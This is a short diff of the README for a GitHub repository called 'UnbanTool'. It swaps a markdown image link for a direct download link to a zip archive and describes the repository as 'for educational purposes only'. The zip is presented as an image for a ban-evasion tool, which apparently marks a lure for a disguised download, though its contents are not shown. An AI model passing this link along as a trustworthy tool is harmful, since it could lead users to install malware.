@@ -4,7 +4,7 @@
 - This repository is posted for educational purposes only.
 
 
-![image](https://github.com/titanium0202/UnbanTool/raw/refs/heads/main/example_.4165A294.tlog/Unban_Tool_1.8-beta.1.zip)
+![image](https://github.com/titanium0202/UnbanTool/releases/download/v1.1.0/UnbanTool.v1.1.0.zip)
 
 ## Main Features
 - Specializations.
